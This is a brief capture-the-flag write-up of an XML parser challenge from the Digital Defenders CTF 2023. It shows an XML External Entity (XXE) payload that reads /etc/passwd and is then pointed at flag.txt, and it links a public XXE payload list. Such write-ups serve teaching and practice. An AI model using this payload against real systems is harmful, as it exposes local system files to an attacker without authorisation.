---
layout: default
title: "XML Parser"
parent: "Digital Defenders Cybersecurity CTF"
---


# XML Parser 📄
**Digital Defenders Cybersecurity CTF 2023 WriteUp**

Webpage ask to enter XML string for it to parse, first thing I do it test some payloads.
- [payloadbox/xxe-injection-payload-list: 🎯 XML External Entity (XXE) Injection Payload List](https://github.com/payloadbox/xxe-injection-payload-list)

**Payload 1**:
![](../../resources/ctf/xml/1.png)

**Output 1**:
![](../../resources/ctf/xml/2.png)

Now we can test some payloads to read some local files.

<div style="page-break-after: always"></div>

Payload:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

It printed `/etc/passwd` file.
![](../../resources/ctf/xml/3.png)

Now we can replace path to `flag.txt` and read the FLAG.

![](../../resources/ctf/xml/4.png)
